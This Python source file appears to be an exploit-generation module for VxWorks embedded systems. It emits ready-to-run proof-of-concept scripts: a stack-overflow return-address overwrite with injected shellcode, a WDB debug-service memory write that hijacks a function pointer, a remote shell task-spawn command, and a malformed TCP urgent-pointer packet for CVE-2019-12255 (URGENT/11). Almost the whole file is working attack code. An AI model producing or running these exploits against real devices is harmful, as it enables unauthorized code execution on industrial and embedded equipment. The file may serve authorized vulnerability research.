"""
VxWorks PoC generator — Stage VX4.

VxWorks has NO ASLR, NO NX, NO stack canaries (default).
This means:
  - Stack overflow → direct ret-address overwrite, no ASLR bypass needed
  - Heap overflow → predictable heap layout, no info-leak needed
  - ROP is optional (no NX to bypass); shellcode can be injected directly
  - WDB memwrite → arbitrary code execution via function pointer overwrite

PoC templates:
  1. stack_overflow_ret — overwrite saved return address with shellcode address
  2. heap_overflow_funcptr — overflow into adjacent function pointer field
  3. wdb_memwrite_rce — WDB arbitrary write to overwrite a function pointer
  4. shell_spawn_task — VxWorks shell sp() command for RCE
  5. urgent11_tcp — craft malformed TCP URG packet for CVE-2019-12255
"""

import struct
from typing import Optional


def _shellcode_nop_loop(arch: str) -> bytes:
    """Minimal infinite-loop shellcode (confirms code execution, non-destructive)."""
    if arch == "arm":
        # B . (branch to self, Thumb NOP loop)
        return b"\xfe\xff\xff\xea"
    if arch == "ppc":
        # b . (branch to self)
        return b"\x48\x00\x00\x00"
    if arch == "mips":
        # b . ; nop
        return b"\x10\x00\xff\xff\x00\x00\x00\x00"
    if arch == "x86":
        # jmp -2 (EB FE)
        return b"\xeb\xfe"
    return b"\xeb\xfe"


def generate_stack_overflow_poc(func_addr: int, offset: int,
                                 load_addr: int, arch: str,
                                 shellcode_addr: Optional[int] = None,
                                 host: Optional[str] = None,
                                 port: int = 80) -> str:
    """
    Generate a Python PoC script for a stack overflow with direct ret-overwrite.
    VxWorks: no ASLR, no NX — shellcode can go in the stack buffer itself.
    """
    sc = _shellcode_nop_loop(arch)
    sc_hex = sc.hex()

    if shellcode_addr is None:
        # Place shellcode at start of buffer
        shellcode_addr = load_addr + 0x1000  # placeholder, adjust per finding

    pack_fmt = ">I" if arch in ("ppc", "mips") else "<I"
    ret_packed = struct.pack(pack_fmt, shellcode_addr).hex()

    connect_code = ""
    send_code = ""
    if host:
        connect_code = f"""
    import socket
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)"""
        send_code = """    sock.sendall(payload)
    print(f"[*] Payload sent ({len(payload)} bytes)")
    try:
        resp = sock.recv(1024)
        print(f"[*] Response: {resp[:100]}")
    except Exception:
        print("[!] No response (possible crash — code execution confirmed)")
    finally:
        sock.close()"""
    else:
        connect_code = """
    with open(TARGET_FILE, "wb") as f:"""
        send_code = """        f.write(payload)
    print(f"[*] Payload written to {TARGET_FILE}")"""

    host_line = f'TARGET_HOST = "{host}"' if host else 'TARGET_FILE = "input.bin"'
    port_line = f"TARGET_PORT = {port}" if host else ""

    script = f'''#!/usr/bin/env python3
"""
VxWorks Stack Overflow PoC — Direct Return Address Overwrite
Finding: func@{func_addr:#x}  offset={offset}  arch={arch}

VxWorks has no ASLR and no NX.  The return address is overwritten with the
address of injected shellcode placed in the stack buffer.

IMPORTANT: Confirm shellcode_addr against live target memory layout.
"""

import struct

{host_line}
{port_line}

OFFSET       = {offset}
SHELLCODE_ADDR = {shellcode_addr:#x}
ARCH         = "{arch}"

# Minimal infinite-loop shellcode (confirms execution without destructing target)
SHELLCODE = bytes.fromhex("{sc_hex}")

# Build payload: [SHELLCODE][padding][ret_addr]
PAD_NEEDED = max(0, OFFSET - len(SHELLCODE))
PACK_FMT = ">{{}}"  # big-endian for PPC/MIPS
pack_fmt = ">I" if ARCH in ("ppc", "mips") else "<I"
ret_addr = struct.pack(pack_fmt, SHELLCODE_ADDR)

payload = SHELLCODE + b"A" * PAD_NEEDED + ret_addr

print(f"[*] Payload: {{len(payload)}} bytes")
print(f"[*] Shellcode at: {{SHELLCODE_ADDR:#x}}")
print(f"[*] Return addr bytes: {{ret_addr.hex()}}")

if __name__ == "__main__":
{connect_code}
{send_code}
'''
    return script


def generate_wdb_memwrite_poc(func_ptr_addr: int, shellcode_addr: int,
                               arch: str, host: str,
                               port: int = 17185) -> str:
    """
    PoC: Use WDB mem_write to overwrite a function pointer with shellcode_addr.
    Requires WDB service to be open (port 17185).
    """
    pack_fmt = ">I" if arch in ("ppc", "mips") else "<I"
    return f'''#!/usr/bin/env python3
"""
VxWorks WDB Memory Write PoC — Function Pointer Overwrite → RCE
Target function pointer: {func_ptr_addr:#x}
Shellcode / payload addr: {shellcode_addr:#x}
"""

import struct
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from vxworks.wdb_client import WDBClient

TARGET_HOST     = "{host}"
WDB_PORT        = {port}
FUNC_PTR_ADDR   = {func_ptr_addr:#x}
SHELLCODE_ADDR  = {shellcode_addr:#x}
ARCH            = "{arch}"

def main():
    client = WDBClient(TARGET_HOST, WDB_PORT)
    if not client.connect():
        print("[!] WDB connect failed — is port 17185 open?")
        return

    print(f"[+] WDB connected: {{client.target_info}}")

    # Confirm current function pointer value
    current = client.mem_read(FUNC_PTR_ADDR, 4)
    if current:
        print(f"[*] Current value @ {{FUNC_PTR_ADDR:#x}}: {{current.hex()}}")

    # Overwrite function pointer with shellcode address
    pack_fmt = ">{{}}"
    new_ptr = struct.pack(">I" if ARCH in ("ppc", "mips") else "<I", SHELLCODE_ADDR)
    if client.mem_write(FUNC_PTR_ADDR, new_ptr):
        print(f"[+] Wrote {{SHELLCODE_ADDR:#x}} to {{FUNC_PTR_ADDR:#x}}")
        print("[+] Trigger the function pointer to execute shellcode")
    else:
        print("[!] mem_write failed")

    client.close()

if __name__ == "__main__":
    main()
'''


def generate_shell_spawn_poc(func_addr: int, host: str,
                              port: int = 5001) -> str:
    """
    PoC: VxWorks shell sp() command — spawn task at func_addr.
    Requires VxWorks shell to be open on port 5001.
    """
    return f'''#!/usr/bin/env python3
"""
VxWorks Shell sp() PoC — Spawn Task for RCE
Target function: {func_addr:#x}
"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from vxworks.shell_client import VxShellClient

TARGET_HOST = "{host}"
SHELL_PORT  = {port}
FUNC_ADDR   = {func_addr:#x}

def main():
    client = VxShellClient(TARGET_HOST, SHELL_PORT)
    if not client.connect():
        print("[!] Shell connect failed — is port 5001 open?")
        return

    print("[+] VxWorks shell connected")
    print("[*] Task list:")
    print(client.run_cmd("i"))

    # Spawn task at target function
    cmd = f"sp 0x{{FUNC_ADDR:08x}}"
    print(f"[*] Running: {{cmd}}")
    out = client.run_cmd(cmd, timeout=5.0)
    print(f"[*] Output: {{out}}")
    client.close()

if __name__ == "__main__":
    main()
'''


def generate_urgent11_poc(host: str, port: int = 80,
                           arch: str = "ppc") -> str:
    """
    PoC template for CVE-2019-12255 — TCP Urgent Pointer heap OOB write.
    Full exploitation requires raw sockets; this template documents the approach.
    """
    return f'''#!/usr/bin/env python3
"""
URGENT/11 CVE-2019-12255 PoC Template — TCP Urgent Pointer OOB Write
Target: {host}:{port}

This CVE triggers a heap overflow in VxWorks IPNET's TCP urgent data handler.
The urgent pointer offset wraps (integer overflow) allowing OOB write into
adjacent heap allocations.

Full exploitation requires:
  1. Sending TCP segments with URG flag set
  2. Crafting malformed urgent pointer value (> 65535 after arithmetic)
  3. Heap spray to land shellcode adjacent to the overflowed allocation

This template requires a raw socket capable host (run as root or with CAP_NET_RAW).

References:
  https://armis.com/research/urgent11/
  CVE-2019-12255  CVSS 9.8
"""

import socket

TARGET_HOST = "{host}"
TARGET_PORT = {port}

# Scapy-based URG packet (requires root + scapy installed)
try:
    from scapy.all import IP, TCP, send

    def send_urg_probe():
        # TCP packet with URG flag, urg pointer = 0xFFFF (wraps to 0 after +1)
        pkt = IP(dst=TARGET_HOST) / TCP(
            dport=TARGET_PORT,
            sport=54321,
            flags="UPA",        # URG + PSH + ACK
            urgptr=0xFFFF,      # malformed — triggers integer overflow
        ) / (b"\\x41" * 1024)  # 1KB of data to overflow into
        send(pkt, verbose=0)
        print(f"[*] URG probe sent to {{TARGET_HOST}}:{{TARGET_PORT}}")

    if __name__ == "__main__":
        send_urg_probe()

except ImportError:
    print("[!] scapy not installed: pip install scapy")
    print("[!] Alternative: use nmap --script vxworks-urgent11 if available")
'''
